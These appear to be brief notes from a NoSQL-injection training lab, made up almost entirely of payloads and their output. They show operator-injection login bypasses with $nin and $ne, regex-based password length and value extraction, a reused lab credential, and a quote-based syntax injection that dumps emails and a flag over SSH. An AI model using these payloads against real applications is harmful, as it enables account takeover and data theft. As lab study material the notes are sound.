


## Logging in as Other Users

```


user[$nin][]=admin&pass[$ne]=admin&remember=on

['username'=>['$nin'=>['admin'] ], 'password'=>['$ne'=>'aweasdf']]




user[$nin][]=admin&user[$nin][]=pedro&pass[$ne]=admin&remember=on
['username'=>['$nin'=>['admin', 'pedro'] ], 'password'=>['$ne'=>'aweasdf']]

admin
john
pedro

```

## Longitud del password y adivinarlo

```

user=admin&pass[$regex]=^.{8}$&remember=on


user=john&pass[$regex]=^10......$&remember=on



user=john&pass[$regex]=^10584312$&remember=on
```


## Usuario que reusa su password

```
pedro
coolpass123


```

## Sintaxis injection

```
 ssh syntax@10.10.139.66
syntax@10.10.139.66's password: 
Please provide the username to receive their email:admin'||1||'
admin@nosql.int
pcollins@nosql.int
jsmith@nosql.int
Syntax@Injection.FTW
Connection to 10.10.139.66 closed.

```

